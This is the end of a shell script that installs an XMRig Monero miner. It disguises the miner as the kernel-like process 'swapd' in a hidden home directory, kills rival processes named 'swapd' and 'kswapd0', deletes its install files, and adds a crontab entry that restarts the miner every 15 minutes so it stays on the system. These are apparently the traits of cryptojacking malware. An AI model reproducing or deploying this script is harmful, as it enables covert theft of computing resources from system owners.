kill -63 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
kill -63 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &

# Clean up xmrig files in login directory
echo "[*] Cleaning up xmrig files in login directory..."
rm -rf ~/xmrig*.* 2>/dev/null

# Cleanup emergency handlers
rm -f /tmp/emergency_pipe
kill %1 %2 2>/dev/null

# Final setup and verification
echo "[*] Setup completed"
echo "Miner is now running in the background"
echo "To check status: ps aux | grep swapd"
echo "To stop miner: killall swapd"
echo "To start miner: $HOME/.swapd/swapd --config=$HOME/.swapd/config.json"

# Print mining stats
echo "[*] Mining to wallet: $WALLET"
echo "You can check your mining stats at: https://moneroocean.stream/?addr=$WALLET"

# Cleanup
rm -rf /tmp/xmrig.tar.gz 2>/dev/null
rm -rf /tmp/moneroocean 2>/dev/null

# Final security check
if [ -f "$HOME/.swapd/swapd" ] && [ -f "$HOME/.swapd/config.json" ]; then
  echo "[*] Verifying installation"
  if pgrep -x swapd >/dev/null; then
    echo "Miner is running properly"
  else
    echo "WARNING: Miner is not running. Starting it now..."
    $HOME/.swapd/swapd --config=$HOME/.swapd/config_background.json >/dev/null 2>&1 &
  fi
else
  echo "ERROR: Installation failed. Key files are missing."
fi

# Add persistence through crontab
if command -v crontab >/dev/null 2>&1; then
  echo "[*] Adding persistence through crontab"
  (crontab -l 2>/dev/null | grep -v "$HOME/.swapd/swapd"; echo "*/15 * * * * $HOME/.swapd/swapd --config=$HOME/.swapd/config_background.json >/dev/null 2>&1") | crontab -
  echo "Crontab entry added for persistence"
fi

echo "[*] All done! Happy mining!"
exit 0
